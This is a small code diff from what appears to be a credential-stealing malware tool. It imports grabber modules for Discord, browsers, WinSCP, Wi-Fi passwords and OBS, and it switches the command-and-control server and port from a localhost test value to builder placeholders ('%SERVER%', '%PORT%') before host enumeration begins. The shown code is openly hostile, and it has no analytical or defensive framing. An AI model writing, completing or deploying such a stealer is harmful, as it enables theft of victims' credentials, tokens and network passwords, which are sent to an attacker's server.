@@ -4,10 +4,10 @@ from libs import discord_grabber, browsers, win_scp, wpa_grab, obs, connection_h
 import socket
 import requests
 
-# C2_SERVER = '%SERVER%'
-# C2_PORT = '%PORT%'
-C2_SERVER = 'localhost'
-C2_PORT = 8080
+C2_SERVER = '%SERVER%'
+C2_PORT = '%PORT%'
+# C2_SERVER = 'localhost'
+# C2_PORT = 8080
 data = {}
 print('Finding IP and Host info...')
 data['Host'] = enum_windows.enum_windows()
